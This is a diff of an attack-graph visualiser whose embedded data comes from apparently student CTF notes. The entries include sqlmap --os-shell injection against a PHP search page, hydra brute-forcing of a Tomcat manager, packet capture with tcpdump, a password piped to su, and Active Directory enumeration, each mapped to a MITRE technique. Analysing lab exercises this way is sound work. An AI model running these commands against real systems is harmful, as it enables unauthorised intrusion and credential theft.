@@ -18,6 +18,12 @@
   .layer-btn:hover { border-color: #58a6ff; color: #58a6ff; }
   .layer-btn.active { background: #1f6feb; border-color: #1f6feb; color: #fff; }
 
+  #flag-bar { padding: 6px 20px; background: #161b22; border-bottom: 1px solid #30363d; display: flex; gap: 6px; overflow-x: auto; flex-shrink: 0; }
+  #flag-bar::-webkit-scrollbar { height: 4px; } #flag-bar::-webkit-scrollbar-thumb { background: #30363d; border-radius: 2px; }
+  .flag-btn { padding: 3px 10px; border: 1px solid #30363d; border-radius: 12px; background: transparent; color: #8b949e; cursor: pointer; font-size: 12px; white-space: nowrap; transition: all 0.15s; flex-shrink: 0; }
+  .flag-btn:hover { border-color: #f1c94e; color: #f1c94e; }
+  .flag-btn.active { background: #f1c94e22; border-color: #f1c94e; color: #f1c94e; }
+
   #main { display: flex; flex: 1; overflow: hidden; }
   #graph-container { flex: 1; position: relative; overflow: hidden; }
   svg { width: 100%; height: 100%; }
@@ -71,6 +77,8 @@
   </div>
 </div>
 
+<div id="flag-bar"></div>
+
 <div id="main">
   <div id="graph-container">
     <div id="stats"></div>
@@ -92,267 +100,138 @@
 <script>
 const GRAPH = {
   "meta": {
-    "total_entries": 13,
+    "total_entries": 53,
     "source_files": [
-      "example.txt"
+      "flag14ce18.txt",
+      "flag3b2000.txt",
+      "flag521bce.txt",
+      "flag59ecca.txt",
+      "flag90b353.txt",
+      "flag9f1f16.txt",
+      "flagadcb1f.txt",
+      "flagcd699a.txt",
+      "flagcfcec8.txt",
+      "flagde3b1c.txt"
     ]
   },
   "nodes": [
     {
       "id": "cmd::0",
       "layer": "command",
-      "label": "nmap -Pn -T4 -p- 10.10.10.5",
+      "label": "show the flag, its on port 80, so we can also do",
       "entry_id": 0,
-      "source_file": "example.txt",
-      "command": "nmap -Pn -T4 -p- 10.10.10.5",
-      "reasoning": "Starting enumeration of the target machine.",
+      "source_file": "flag14ce18.txt",
+      "command": "show the flag, its on port 80, so we can also do",
+      "reasoning": "TThis is a continuation of the sqlmap again inspect the ip adress or do ip addr in the os shell, doenst matter if u do it as root or not once thats done, this is what will be seen 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen > link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qle> link/ether 42:01:0a:7b:52:c5 brd ff:ff:ff:ff:ff:ff inet 10.123.82.197/32 metric 100 scope global dynamic ens4 valid_lft 2871sec preferred_lft 2871sec inet 10.0.2.197/32 scope global ens4 valid_lft forever preferred_lft forever inet6 fe80::4001:aff:fe7b:52c5/64 scope link valid_lft forever preferred_lft forever its using ens4 and then dump all traffic onto a pcap file in the tmp folder using the following command tcpdump -i ens4 -w /tmp/traffic.pcap -c 2000 where c stands for packets, -i specifies the interface, w to write the file wait for 2-3 minutes echo 'password123' | su www-data -c 'strings /tmp/traffic.pcap | grep -i \"flag\"' then do this command to filter thru the strings in the traffic dump and the output will",
       "output": "",
       "exit_code": null,
-      "agent_name": "example",
+      "agent_name": "flag14ce18",
       "raw": {
         "entry_id": 0,
-        "tool": "nmap",
-        "action": "port_scan",
-        "target": "10.10.10.5",
-        "phase": "reconnaissance",
-        "is_noise": false,
-        "cleaned_command": "nmap -Pn -T4 -p- 10.10.10.5"
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
       },
       "mitre": {
         "entry_id": 0,
-        "technique_id": "T1046",
-        "technique_name": "Network Service Discovery",
-        "tactic": "discovery",
-        "confidence": 0.99
+        "technique_id": "T1040",
+        "technique_name": "Network Sniffing",
+        "tactic": "collection",
+        "confidence": 0.72
       },
       "actions_effects": {
         "entry_id": 0,
-        "action_name": "scanAllPorts",
-        "action_description": "Perform a full TCP port scan on the target to discover all open ports.",
-        "phase": "reconnaissance",
-        "produces_effects": [
-          "openPortsKnown"
-        ],
+        "action_name": "noise",
+        "action_description": "Prose notes describing a tcpdump traffic capture workflow to find a flag on port 80.",
+        "phase": "noise",
+        "produces_effects": [],
         "requires_effects": [],
-        "is_noise": false
+        "is_noise": true
       },
-      "color_command": "#4e9af1",
-      "color_mitre": "#e8884a",
-      "color_action": "#4e9af1"
+      "color_command": "#555555",
+      "color_mitre": "#a0522d",
+      "color_action": "#555555"
     },
     {
       "id": "cmd::1",
       "layer": "command",
-      "label": "nmap -sV -sC -p 22,80,3306 10.10.10.5",
+      "label": "",
       "entry_id": 1,
-      "source_file": "example.txt",
-      "command": "nmap -sV -sC -p 22,80,3306 10.10.10.5",
-      "reasoning": "",
+      "source_file": "flag14ce18.txt",
+      "command": "",
+      "reasoning": "strings /tmp/traffic.pcap | grep \"14ce18\" or tcpdump -r /tmp/traffic.pcap 'port 80' -A | strings | grep \"14ce18\" tcpdump - the packet capture tool -r /tmp/traffic.pcap - read from the existing capture file (instead of capturing live) 'port 80' - filter to show only packets on port 80 (HTTP traffic) -A - print packet contents in ASCII format (human-readable text) | strings - pipe output to strings command, which extracts only printable text (filters> | grep \"14ce18\" - pipe to grep to search for lines containing \"14ce18\"",
       "output": "",
       "exit_code": null,
-      "agent_name": "example",
+      "agent_name": "flag14ce18",
       "raw": {
         "entry_id": 1,
-        "tool": "nmap",
-        "action": "service_version_scan",
-        "target": "10.10.10.5",
-        "phase": "reconnaissance",
-        "is_noise": false,
-        "cleaned_command": "nmap -sV -sC -p 22,80,3306 10.10.10.5"
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
       },
       "mitre": {
         "entry_id": 1,
-        "technique_id": "T1046",
-        "technique_name": "Network Service Discovery",
-        "tactic": "discovery",
-        "confidence": 0.97
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
       },
       "actions_effects": {
         "entry_id": 1,
-        "action_name": "identifyServices",
-        "action_description": "Run service version and default script scans against discovered open ports to fingerprint running services.",
-        "phase": "reconnaissance",
-        "produces_effects": [
-          "servicesIdentified"
-        ],
-        "requires_effects": [
-          "openPortsKnown"
-        ],
-        "is_noise": false
+        "action_name": "noise",
+        "action_description": "Prose notes describing how to filter a pcap file with tcpdump and grep for a flag string.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
       },
-      "color_command": "#4e9af1",
-      "color_mitre": "#e8884a",
-      "color_action": "#4e9af1"
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
     },
     {
       "id": "cmd::2",
       "layer": "command",
-      "label": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/di",
+      "label": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"",
       "entry_id": 2,
-      "source_file": "example.txt",
-      "command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt",
-      "reasoning": "Found port 80 open with Apache. Let's check for web vulnerabilities.",
+      "source_file": "flag3b2000.txt",
+      "command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --os-shell --batch",
+      "reasoning": "This is a continuation of the flag de3b, once I have done the sql injection and checked the files in the cuiter database. There were 5 databases and the flag de3b was in cuituer database. using sqlmap again, and more intrigiuing features of sqlmap so the new command for this is by using the os shell feature of sqlmap",
       "output": "",
       "exit_code": null,
-      "agent_name": "example",
+      "agent_name": "flag3b2000",
       "raw": {
         "entry_id": 2,
-        "tool": "gobuster",
-        "action": "directory_enumeration",
-        "target": "http://10.10.10.5",
-        "phase": "reconnaissance",
+        "tool": "sqlmap",
+        "action": "os_shell_access",
+        "target": "http://10.0.2.197/php/recherche_old.php",
+        "phase": "exploitation",
         "is_noise": false,
-        "cleaned_command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt"
+        "cleaned_command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --os-shell --batch"
       },
       "mitre": {
         "entry_id": 2,
-        "technique_id": "T1083",
-        "technique_name": "File and Directory Discovery",
-        "tactic": "discovery",
-        "confidence": 0.92
-      },
-      "actions_effects": {
-        "entry_id": 2,
-        "action_name": "enumerateWebDirs",
-        "action_description": "Brute-force common directory and file paths on the web server to discover hidden resources.",
-        "phase": "reconnaissance",
-        "produces_effects": [
-          "webDirsEnumerated"
-        ],
-        "requires_effects": [
-          "servicesIdentified"
-        ],
-        "is_noise": false
-      },
-      "color_command": "#4e9af1",
-      "color_mitre": "#e8884a",
-      "color_action": "#4e9af1"
-    },
-    {
-      "id": "cmd::3",
-      "layer": "command",
-      "label": "nikto -h http://10.10.10.5",
-      "entry_id": 3,
-      "source_file": "example.txt",
-      "command": "nikto -h http://10.10.10.5",
-      "reasoning": "",
-      "output": "",
-      "exit_code": null,
-      "agent_name": "example",
-      "raw": {
-        "entry_id": 3,
-        "tool": "nikto",
-        "action": "web_vulnerability_scan",
-        "target": "http://10.10.10.5",
-        "phase": "reconnaissance",
-        "is_noise": false,
-        "cleaned_command": "nikto -h http://10.10.10.5"
-      },
-      "mitre": {
-        "entry_id": 3,
-        "technique_id": "T1595.003",
-        "technique_name": "Active Scanning: Wordlist Scanning",
-        "tactic": "reconnaissance",
-        "confidence": 0.88
-      },
-      "actions_effects": {
-        "entry_id": 3,
-        "action_name": "scanWebVulnerabilities",
-        "action_description": "Run an automated web vulnerability scanner against the target HTTP service to identify misconfigurations and known issues.",
-        "phase": "reconnaissance",
-        "produces_effects": [
-          "webVulnerabilitiesIdentified"
-        ],
-        "requires_effects": [
-          "servicesIdentified"
-        ],
-        "is_noise": false
-      },
-      "color_command": "#4e9af1",
-      "color_mitre": "#4e9af1",
-      "color_action": "#4e9af1"
-    },
-    {
-      "id": "cmd::4",
-      "layer": "command",
-      "label": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.",
-      "entry_id": 4,
-      "source_file": "example.txt",
-      "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form \"/admin/login:username=^USER^&password=^PASS^:Invalid\"",
-      "reasoning": "Discovered /admin login page. Trying default credentials first, then brute force.",
-      "output": "",
-      "exit_code": null,
-      "agent_name": "example",
-      "raw": {
-        "entry_id": 4,
-        "tool": "hydra",
-        "action": "brute_force",
-        "target": "http://10.10.10.5/admin/login",
-        "phase": "exploitation",
-        "is_noise": false,
-        "cleaned_command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form \"/admin/login:username=^USER^&password=^PASS^:Invalid\""
-      },
-      "mitre": {
-        "entry_id": 4,
-        "technique_id": "T1110.001",
-        "technique_name": "Brute Force: Password Guessing",
-        "tactic": "credential-access",
-        "confidence": 0.98
-      },
-      "actions_effects": {
-        "entry_id": 4,
-        "action_name": "bruteForceWebLogin",
-        "action_description": "Perform a dictionary-based brute-force attack against the discovered admin login form to obtain valid credentials.",
-        "phase": "exploitation",
-        "produces_effects": [
-          "webCredentialsObtained"
-        ],
-        "requires_effects": [
-          "webDirsEnumerated"
-        ],
-        "is_noise": false
-      },
-      "color_command": "#e84a4a",
-      "color_mitre": "#da77f2",
-      "color_action": "#e84a4a"
-    },
-    {
-      "id": "cmd::5",
-      "layer": "command",
-      "label": "ssh admin@10.10.10.5",
-      "entry_id": 5,
-      "source_file": "example.txt",
-      "command": "ssh admin@10.10.10.5",
-      "reasoning": "Got credentials admin:password123. Logging in via SSH.",
-      "output": "",
-      "exit_code": null,
-      "agent_name": "example",
-      "raw": {
-        "entry_id": 5,
-        "tool": "ssh",
-        "action": "remote_login",
-        "target": "admin@10.10.10.5",
-        "phase": "exploitation",
-        "is_noise": false,
-        "cleaned_command": "ssh admin@10.10.10.5"
-      },
-      "mitre": {
-        "entry_id": 5,
-        "technique_id": "T1078",
-        "technique_name": "Valid Accounts",
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
         "tactic": "initial-access",
-        "confidence": 0.95
+        "confidence": 0.93
       },
       "actions_effects": {
-        "entry_id": 5,
-        "action_name": "loginSSH",
-        "action_description": "Authenticate to the SSH service using credentials obtained from the brute-force attack to establish a remote shell session.",
+        "entry_id": 2,
+        "action_name": "exploitSQLiOSShell",
+        "action_description": "Use sqlmap's --os-shell feature against a vulnerable PHP parameter to gain an interactive OS shell on the target.",
         "phase": "exploitation",
         "produces_effects": [
-          "shellAccessGained"
+          "osShellAccess"
         ],
         "requires_effects": [
-          "webCredentialsObtained"
+          "sqlInjectionVulnFound"
         ],
         "is_noise": false
       },
@@ -361,42 +240,170 @@ const GRAPH = {
       "color_action": "#e84a4a"
     },
     {
-      "id": "cmd::6",
+      "id": "cmd::3",
       "layer": "command",
-      "label": "whoami",
-      "entry_id": 6,
-      "source_file": "example.txt",
-      "command": "whoami",
-      "reasoning": "Checking what we have access to.",
+      "label": "ls",
+      "entry_id": 3,
+      "source_file": "flag3b2000.txt",
+      "command": "ls",
+      "reasoning": "this is the command that has given me shell access to the database and then once i had access to the database, i did ls to find all available stuff",
       "output": "",
       "exit_code": null,
-      "agent_name": "example",
+      "agent_name": "flag3b2000",
       "raw": {
-        "entry_id": 6,
-        "tool": "whoami",
-        "action": "user_enumeration",
-        "target": "localhost",
+        "entry_id": 3,
+        "tool": "ls",
+        "action": "directory_listing",
+        "target": "/var/www/html/php",
         "phase": "post-exploitation",
         "is_noise": false,
-        "cleaned_command": "whoami"
+        "cleaned_command": "ls"
+      },
+      "mitre": {
+        "entry_id": 3,
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "confidence": 0.82
+      },
+      "actions_effects": {
+        "entry_id": 3,
+        "action_name": "listDirectory",
+        "action_description": "List files in the current directory to discover available resources on the compromised host.",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "directoryContentsKnown"
+        ],
+        "requires_effects": [
+          "osShellAccess"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::4",
+      "layer": "command",
+      "label": "pwd",
+      "entry_id": 4,
+      "source_file": "flag3b2000.txt",
+      "command": "pwd",
+      "reasoning": "do you want to retrieve the command standard output? [Y/n/a] Y command standard output: --- abonnements.php abonnes.php bibli_cuiteur.php bibli_generale.php blabla.php comparaison_requetes.txt compte.php cuiteur.php deconnexion.php inscription.php mentions.php recherche.php recherche_old.php suggestions.php tendances.php tmpbsyqu.php tmpubxzx.php tmpugnip.php utilisateur.php ---",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag3b2000",
+      "raw": {
+        "entry_id": 4,
+        "tool": "pwd",
+        "action": "print_working_directory",
+        "target": "/var/www/html/php",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "pwd"
+      },
+      "mitre": {
+        "entry_id": 4,
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "confidence": 0.75
+      },
+      "actions_effects": {
+        "entry_id": 4,
+        "action_name": "checkWorkingDirectory",
+        "action_description": "Print the current working directory to confirm the shell's location on the filesystem.",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "currentDirectoryKnown"
+        ],
+        "requires_effects": [
+          "osShellAccess"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::5",
+      "layer": "command",
+      "label": "",
+      "entry_id": 5,
+      "source_file": "flag3b2000.txt",
+      "command": "",
+      "reasoning": "do you want to retrieve the command standard output? [Y/n/a] Y command standard output: '/var/www/html/php'",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag3b2000",
+      "raw": {
+        "entry_id": 5,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
+      },
+      "mitre": {
+        "entry_id": 5,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 5,
+        "action_name": "noise",
+        "action_description": "Empty command entry whose reasoning only shows the pwd command output.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::6",
+      "layer": "command",
+      "label": "ls -la /var/www/html/",
+      "entry_id": 6,
+      "source_file": "flag3b2000.txt",
+      "command": "ls -la /var/www/html/",
+      "reasoning": "and then i did the following command",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag3b2000",
+      "raw": {
+        "entry_id": 6,
+        "tool": "ls",
+        "action": "directory_listing",
+        "target": "/var/www/html/",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "ls -la /var/www/html/"
       },
       "mitre": {
         "entry_id": 6,
-        "technique_id": "T1033",
-        "technique_name": "System Owner/User Discovery",
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
         "tactic": "discovery",
-        "confidence": 0.99
+        "confidence": 0.88
       },
       "actions_effects": {
         "entry_id": 6,
-        "action_name": "gatherSystemInfo",
-        "action_description": "Query the current user identity to understand the privilege level of the obtained shell.",
+        "action_name": "listDirectory",
+        "action_description": "List the web root directory with full details to enumerate hosted files and potential targets.",
         "phase": "post-exploitation",
         "produces_effects": [
-          "currentUserKnown"
+          "webRootContentsKnown"
         ],
         "requires_effects": [
-          "shellAccessGained"
+          "osShellAccess"
         ],
         "is_noise": false
       },
@@ -407,37 +414,632 @@ const GRAPH = {
     {
       "id": "cmd::7",
       "layer": "command",
-      "label": "id",
+      "label": "",
       "entry_id": 7,
-      "source_file": "example.txt",
-      "command": "id",
-      "reasoning": "",
+      "source_file": "flag3b2000.txt",
+      "command": "",
+      "reasoning": "to move out and see whats there as cd .. wasnt working and i saw more things are there, but it was throwing issues s-shell> find /var/www -type f 2>/dev/null do you want to retrieve the command standard output? [Y/n/a] Y command standard output: --- /var/www/html/index.php /var/www/html/styles/cuiteur__.css_ /var/www/html/styles/cuiteur.css /var/www/html/styles/presentation.css /var/www/html/images/cherche.png /var/www/html/images/fond_info.png /var/www/html/images/speaker.png /var/www/html/images/entete.jpg /var/www/html/images/trombone_over.png /var/www/html/images/haut_parleur.png /var/www/html/images/trait.png /var/www/html/images/connecte.png /var/www/html/images/deconnecte.png /var/www/html/images/micro.jpg /var/www/html/images/bouton_over.png /var/www/html/images/anonyme.jpg /var/www/html/images/cherche_over.png /var/www/html/images/trombone.png /var/www/html/images/config.png /var/www/html/images/bouton.png /var/www/html/images/entete_deconnecte.jpg /var/www/html/images/home.png /var/www/html/images/photos/telephone3.jpg /var/www/html/images/photos/serveur1.jpg /var/www/html/images/photos/bd2_grande.jpg /var/www/html/images/photos/bd1.jpg /var/www/html/images/photos/megaphone.jpg /var/www/html/images/photos/serveur2_grande.jpg /var/www/html/images/photos/serveur3_grande.jpg /var/www/html/images/photos/radio.jpg /var/www/html/images/photos/cuiteurophone.png /var/www/html/images/photos/mail.jpg /var/www/html/images/photos/bd2.jpg /var/www/html/images/photos/mail_grande.jpg /var/www/html/images/photos/serveur4_grande.jpg /var/www/html/images/photos/serveur3.jpg /var/www/html/images/photos/bd1_grande.jpg /var/www/html/images/photos/telephone1.jpg /var/www/html/images/photos/moustique.jpg /var/www/html/images/photos/securite.jpg /var/www/html/images/photos/serveur1_grande.jpg /var/www/html/images/photos/dactylo.jpg /var/www/html/images/photos/cuiteur.png /var/www/html/images/photos/telephone4.jpg /var/www/html/images/photos/serveur4.jpg /var/www/html/images/photos/serveur2.jpg /var/www/html/images/photos/clavier.jpg /var/www/html/images/home_over.png /var/www/html/images/config_over.png /var/www/html/images/saisie.png /var/www/html/images/fond_blabla.png /var/www/html/images/fond.jpg /var/www/html/images/favicon.ico /var/www/html/images/haut_parleur_over.png /var/www/html/images/pied.png /var/www/html/upload/4.jpg /var/www/html/upload/24.jpg /var/www/html/upload/7.jpg /var/www/html/upload/25.jpg /var/www/html/upload/6.jpg /var/www/html/upload/5.jpg /var/www/html/upload/22.jpg /var/www/html/upload/27.jpg /var/www/html/upload/1.jpg /var/www/html/upload/3.jpg /var/www/html/upload/26.jpg /var/www/html/upload/2.jpg /var/www/html/upload/23.jpg /var/www/html/php/comparaison_requetes.txt /var/www/html/php/abonnements.php /var/www/html/php/tmpbsyqu.php /var/www/html/php/mentions.php /var/www/html/php/abonnes.php /var/www/html/php/utilisateur.php /var/www/html/php/bibli_cuiteur.php /var/www/html/php/suggestions.php /var/www/html/php/recherche.php /var/www/html/php/tmpubxzx.php /var/www/html/php/blabla.php /var/www/html/php/tendances.php /var/www/html/php/cuiteur.php /var/www/html/php/deconnexion.php /var/www/html/php/tmpugnip.php /var/www/html/php/recherche_old.php /var/www/html/php/inscription.php /var/www/html/php/bibli_generale.php /var/www/html/php/compte.php /var/www/html/flag{3b20008aaca41a229f98fa8a0221022dac636b0295477b}.jpg /var/www/html/html/moyens.html /var/www/html/html/presentation.html /var/www/html/index.html --- and then after doing that command, i got the flag 3b2000 and then i copied it onto my device",
       "output": "",
       "exit_code": null,
-      "agent_name": "example",
+      "agent_name": "flag3b2000",
       "raw": {
         "entry_id": 7,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
+      },
+      "mitre": {
+        "entry_id": 7,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 7,
+        "action_name": "noise",
+        "action_description": "Prose notes describing a find command and flag discovery in the web root directory.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::8",
+      "layer": "command",
+      "label": "",
+      "entry_id": 8,
+      "source_file": "flag521bce.txt",
+      "command": "",
+      "reasoning": "first thing first, find cuiter, it was on 10.0.2.197 for me after that create an account and then go to comments in comments page, aka suggestions.php, inspect it and then itll have some page called reserche.php smtg, try to open that page and then inspect that, youll see the flag in it",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag521bce",
+      "raw": {
+        "entry_id": 8,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
+      },
+      "mitre": {
+        "entry_id": 8,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 8,
+        "action_name": "noise",
+        "action_description": "Prose walkthrough notes explaining how to find and inspect a vulnerable PHP search page to locate a flag.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::9",
+      "layer": "command",
+      "label": "",
+      "entry_id": 9,
+      "source_file": "flag59ecca.txt",
+      "command": "",
+      "reasoning": "Exactly the same as flag cd699a to enter into the tomcat thing thru metasploit but then I need to navigate to the C folder again or just activate powershell In powershell, do the following commands Get-Module -ListAvailable Import-Module ActiveDirectory Get-ADForest Get-ADDomainController Get-ADObject -Filter * -Properties * | Where-Object {$_.Description -match \"59ecca\"} and then flag is found Topics Covered: 1. PowerShell Basics Using PowerShell command-line interface Running cmdlets (PowerShell commands) Piping output between commands using | 2. PowerShell Module Management Get-Module -ListAvailable: Discovering what modules are installed on the system Import-Module: Loading modules to access their cmdlets (specifically the ActiveDirectory module) 3. Active Directory (AD) Enumeration Domain Information: Used Get-ADDomain to gather details about the AD domain (name, controllers, SID, etc.) Forest Information: Used Get-ADForest to understand the forest structure (root domain, forest functional level) Domain Controller Discovery: Used Get-ADDomainController to identify and gather info about domain controllers (server names, IPs, FSMO roles) 4. Active Directory Object Querying Get-ADObject: Retrieved ALL objects from Active Directory -Filter *: Used wildcard to get every object (users, computers, groups, OUs, etc.) -Properties *: Pulled all properties/attributes for each object 5. Data Filtering with PowerShell Where-Object: Filtered results based on conditions Regular expression matching: Used -match operator to search for patterns Pattern searching: Looked for keywords like \"flag\", \"CTF\", and special characters { } commonly found in CTF flags 6. CTF Flag Discovery Searched AD object descriptions for hidden flags Used enumeration techniques to find flags embedded in AD metadata Summary: Windows Active Directory reconnaissance and enumeration using PowerShell to discover domain structure and locate hidden CTF flags in object properties",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag59ecca",
+      "raw": {
+        "entry_id": 9,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
+      },
+      "mitre": {
+        "entry_id": 9,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 9,
+        "action_name": "noise",
+        "action_description": "Prose notes describing Active Directory enumeration via PowerShell to locate a CTF flag in object descriptions.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::10",
+      "layer": "command",
+      "label": "nmap 10.0.3.0/24",
+      "entry_id": 10,
+      "source_file": "flag90b353.txt",
+      "command": "nmap 10.0.3.0/24",
+      "reasoning": "flag 90b353 inspect network for http as i need to go to hacker manifesto",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag90b353",
+      "raw": {
+        "entry_id": 10,
+        "tool": "nmap",
+        "action": "network_scan",
+        "target": "10.0.3.0/24",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "nmap 10.0.3.0/24"
+      },
+      "mitre": {
+        "entry_id": 10,
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery",
+        "tactic": "discovery",
+        "confidence": 0.97
+      },
+      "actions_effects": {
+        "entry_id": 10,
+        "action_name": "scanNetwork",
+        "action_description": "Run an nmap scan against the /24 subnet to discover live hosts and open ports.",
+        "phase": "reconnaissance",
+        "produces_effects": [
+          "hostDiscovered",
+          "openPortsKnown"
+        ],
+        "requires_effects": [],
+        "is_noise": false
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#e8884a",
+      "color_action": "#4e9af1"
+    },
+    {
+      "id": "cmd::11",
+      "layer": "command",
+      "label": "hydra -L usernames.txt -P passwords.txt 10.0.3.197 -s 8282 h",
+      "entry_id": 11,
+      "source_file": "flag90b353.txt",
+      "command": "hydra -L usernames.txt -P passwords.txt 10.0.3.197 -s 8282 http-get /manager/html -t 4 -V",
+      "reasoning": "command to check user passwords as clicking on the manager app asks for username and password [8282][http-get] host: 10.0.3.197   login: root   password: 1234 this is the password match and hydra command to check the passwords",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag90b353",
+      "raw": {
+        "entry_id": 11,
+        "tool": "hydra",
+        "action": "brute_force",
+        "target": "10.0.3.197",
+        "phase": "exploitation",
+        "is_noise": false,
+        "cleaned_command": "hydra -L usernames.txt -P passwords.txt 10.0.3.197 -s 8282 http-get /manager/html -t 4 -V"
+      },
+      "mitre": {
+        "entry_id": 11,
+        "technique_id": "T1110",
+        "technique_name": "Brute Force",
+        "tactic": "credential-access",
+        "confidence": 0.97
+      },
+      "actions_effects": {
+        "entry_id": 11,
+        "action_name": "bruteForceHTTP",
+        "action_description": "Use Hydra to brute-force HTTP Basic Auth credentials against the Tomcat manager interface on a non-standard port.",
+        "phase": "exploitation",
+        "produces_effects": [
+          "webCredentialsObtained"
+        ],
+        "requires_effects": [
+          "openPortsKnown"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#e84a4a",
+      "color_mitre": "#da77f2",
+      "color_action": "#e84a4a"
+    },
+    {
+      "id": "cmd::12",
+      "layer": "command",
+      "label": "",
+      "entry_id": 12,
+      "source_file": "flag90b353.txt",
+      "command": "",
+      "reasoning": "and inspect the pages and under one of the link, the image source was the flag",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag90b353",
+      "raw": {
+        "entry_id": 12,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
+      },
+      "mitre": {
+        "entry_id": 12,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 12,
+        "action_name": "noise",
+        "action_description": "Prose note stating the flag was found embedded in an image source link on a web page.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::13",
+      "layer": "command",
+      "label": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"",
+      "entry_id": 13,
+      "source_file": "flag9f1f16.txt",
+      "command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --os-shell --batch",
+      "reasoning": "This is also very similar to the flag 3b2000, also starts off by going to the os shell thru the sqlmap which is so the new command for this is by using the os shell feature of sqlmap",
